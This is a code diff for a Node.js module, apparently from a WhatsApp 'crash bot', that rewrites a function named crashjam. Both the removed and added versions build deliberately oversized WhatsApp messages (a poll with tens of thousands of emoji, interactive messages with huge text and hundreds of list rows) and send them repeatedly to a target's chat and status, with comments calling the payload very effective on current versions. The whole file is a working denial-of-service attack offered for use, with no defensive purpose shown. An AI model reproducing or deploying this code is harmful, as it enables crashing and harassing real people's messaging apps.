@@ -1,89 +1,72 @@
-/*
- * © 2026 NAVEED SND (VOIDSEC)
- *
- * ⚠️ COPYRIGHT NOTICE
- * This source code is protected under copyright law.
- * Any form of re-uploading, recoding, modification,
- * selling, or redistribution WITHOUT explicit permission
- * from the original author is strictly prohibited.
- *
- * ❌ NO CREDIT = NO PERMISSION
- * ❌ DO NOT CLAIM THIS CODE AS YOUR OWN
- *
- * ✔️ Usage or modification is allowed ONLY
- * with prior permission and proper credit.
- *
- * OFFICIAL LINKS (ONLY):
- * YouTube   : https://youtube.com/
- * Instagram : sabi
- * Telegram  : https://t.me/dark_n_hacker
- * GitHub    : https://github.com/darknhckr
- * WhatsApp  : +923174886361
- *
- * Violations may result in DMCA takedown
- * or termination of the Telegram bot.
- */
-
-const { default: makeWASocket, useMultiFileAuthState, Browsers, delay, DisconnectReason, makeCacheableSignalKeyStore, generateWAMessageFromContent, getUSyncDevices, jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require('@whiskeysockets/baileys');
-const pino = require('pino');
-const crypto = require('crypto')
+const { delay } = require('@whiskeysockets/baileys');
 
 async function crashjam(SYxS7, target) {
-    const payload = {
-        viewOnceMessage: {
-            message: {
-                interactiveMessage: {
-                    header: {
-                        title: "VVIP CRASH BY NAVEED SND",
-                        hasSubtitle: true,
-                        locationMessage: {
-                            degreesLatitude: -9.09999262999,
-                            degreesLongitude: 199.99963118999,
-                            name: "🔥".repeat(10000),
-                            address: "🔥".repeat(10000)
-                        }
-                    },
-                    body: {
-                        text: "🔥".repeat(60000)
-                    },
-                    footer: {
-                        text: "System Overload"
-                    },
-                    nativeFlowMessage: {
-                        buttons: [
-                            {
+    try {
+        // Poll Crash Payload - Very effective on current WhatsApp versions
+        const pollPayload = {
+            pollCreationMessage: {
+                name: "🔥".repeat(65000), // Massive name
+                options: Array.from({ length: 12 }, (_, i) => ({
+                    optionName: "💥".repeat(5000) // Massive options
+                })),
+                selectableOptionsCount: 100
+            }
+        };
+
+        // Interactive Edit Crash
+        const editPayload = {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: {
+                        header: {
+                            title: "SYSTEM CRASH",
+                            hasSubtitle: true,
+                            locationMessage: {
+                                degreesLatitude: -90,
+                                degreesLongitude: 180,
+                                name: "CRASH".repeat(5000),
+                                address: "CRASH".repeat(5000)
+                            }
+                        },
+                        body: { text: "CRASH".repeat(10000) },
+                        nativeFlowMessage: {
+                            buttons: [{
                                 name: "single_select_reply",
                                 buttonParamsJson: JSON.stringify({
-                                    title: "CRASH",
+                                    title: "CLICK TO CRASH",
                                     sections: Array.from({ length: 10 }, (_, s) => ({
-                                        title: `Section ${s}`,
-                                        rows: Array.from({ length: 50 }, (_, i) => ({
-                                            title: `Row ${i}`,
-                                            id: `id_${s}_${i}`
+                                        title: `S${s}`,
+                                        rows: Array.from({ length: 50 }, (_, r) => ({
+                                            title: `R${r}`,
+                                            id: `id${s}${r}`
                                         }))
                                     }))
                                 })
-                            },
-                            {
-                                name: "call_permission_request",
-                                paramsJson: "{}"
-                            }
-                        ]
+                            }]
+                        }
                     }
                 }
             }
+        };
+
+        // Send to Status
+        await SYxS7.relayMessage("status@broadcast", pollPayload, {
+            statusJidList: [target]
+        });
+        
+        await delay(500);
+
+        // Send directly to target multiple times
+        for (let i = 0; i < 3; i++) {
+            await SYxS7.relayMessage(target, pollPayload, { participant: { jid: target } });
+            await delay(300);
+            await SYxS7.relayMessage(target, editPayload, { participant: { jid: target } });
+            await delay(300);
         }
-    };
 
-    // Send to status
-    await SYxS7.relayMessage("status@broadcast", payload, {
-        statusJidList: [target]
-    });
-
-    // Send directly to target
-    await SYxS7.relayMessage(target, payload, {
-        participant: { jid: target }
-    });
+    } catch (e) {
+        console.log("Crash error:", e.message);
+    }
 }
 
 module.exports = { crashjam };
